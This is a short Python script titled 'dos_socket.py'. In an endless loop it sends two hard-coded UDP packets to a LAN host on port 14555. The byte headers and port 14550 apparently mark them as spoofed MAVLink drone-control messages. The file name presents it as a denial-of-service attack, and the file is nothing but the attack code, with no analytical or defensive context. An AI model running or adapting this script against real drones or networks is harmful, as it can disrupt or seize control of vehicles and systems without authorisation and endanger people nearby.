# -*- coding: utf-8 -*-
# time : 2022/11/26 1:15
# file : dos_socket.py
# author : erchen
# description : 192.168.43.1

import socket
import sys
import time

udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udp_socket.bind(('192.168.43.148', 14550))
dst_addr = ('192.168.43.123', 14555)

data1 = b'\xfe\x09\x0f\xff\xbe\x00\x00\x00\x00\x00\x06\x08\x00\x00\x03\xcc\xdd'

data2 = b"\xfe\x06\xff\xff\xbe\x42\x02\x00\x01\x01\x01\x01\x1b\xa0"

while True:
    udp_socket.sendto(data1, dst_addr)
    udp_socket.sendto(data2, dst_addr)

    time.sleep(1)

# udp_socket.close()